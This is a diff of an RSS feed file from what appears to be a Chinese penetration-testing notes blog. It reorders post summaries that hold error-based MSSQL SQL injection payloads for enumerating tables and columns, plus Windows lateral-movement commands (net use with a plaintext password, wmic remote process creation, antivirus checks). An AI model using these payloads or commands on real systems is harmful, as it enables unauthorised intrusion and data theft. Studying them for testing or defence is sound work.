@@ -10,6 +10,15 @@
 </copyright>
     <lastBuildDate>Tue, 12 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>mssql</title>
+      <link>/posts/mssql/</link>
+      <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/mssql/</guid>
+      <description>爆表名 1 2 3 4  &amp;#39; and 1=(select top 1 name from sysobjects where xtype=&amp;#39;u&amp;#39; and name !=&amp;#39;info&amp;#39;);-- 没当爆出来一个表名需要添加!= 之前的表名 and 1=(select top 1 name from sysobjects where xtype=&amp;#39;u&amp;#39; and name !=&amp;#39;info&amp;#39; and name != &amp;#39;new&amp;#39;);   1  selecttop1namefrom(selecttop2namefromsysobjectswherextype=0x75orderbyname)torderbynamedesc  爆字段名 1 2 3 4  &amp;#39; and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &amp;#39;admin&amp;#39;) and name&amp;lt;&amp;gt;&amp;#39;id&amp;#39;);-- 也是一样的爆出来一个 去!=一个 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &amp;#39;admin&amp;#39;) and name&amp;lt;&amp;gt;&amp;#39;id&amp;#39; and name !</description>
+    </item>
+    
+    <item>
       <title>winrm横向</title>
       <link>/posts/winrm/</link>
       <pubDate>Tue, 12 Oct 2021 00:00:00 +0000</pubDate>
@@ -50,15 +59,6 @@ administrator的hash不一样或者没用administrator的情况下
  net use \\192.168.17.138\c$ &amp;quot;admin123&amp;quot; /user:pt007 dir \\192.168.17.138\c$  判断出可以进行远程执行命令的时候可往对方机器执行一个cmd命令tasklist查看进程再重定向到一个文件
  shell wmic /node:10.41.18.3 process call create &amp;quot;cmd.exe /c tasklist&amp;gt;c:\result.txt&amp;quot;  再查看这个result.txt，查看进程里面有没有杀毒软件，卡巴斯基是avp.exe
 shell type \\10.44.171.3\c$\result1.txt  直接tasklist /v 可以看到哪个用户启动的进程</description>
-    </item>
-    
-    <item>
-      <title>mssql</title>
-      <link>/posts/mssql/</link>
-      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
-      
-      <guid>/posts/mssql/</guid>
-      <description>爆表名 1 2 3 4  &amp;#39; and 1=(select top 1 name from sysobjects where xtype=&amp;#39;u&amp;#39; and name !=&amp;#39;info&amp;#39;);-- 没当爆出来一个表名需要添加!= 之前的表名 and 1=(select top 1 name from sysobjects where xtype=&amp;#39;u&amp;#39; and name !=&amp;#39;info&amp;#39; and name != &amp;#39;new&amp;#39;);   1  selecttop1namefrom(selecttop2namefromsysobjectswherextype=0x75orderbyname)torderbynamedesc  爆字段名 1 2 3 4  &amp;#39; and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &amp;#39;admin&amp;#39;) and name&amp;lt;&amp;gt;&amp;#39;id&amp;#39;);-- 也是一样的爆出来一个 去!=一个 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &amp;#39;admin&amp;#39;) and name&amp;lt;&amp;gt;&amp;#39;id&amp;#39; and name !</description>
     </item>
     
     <item>
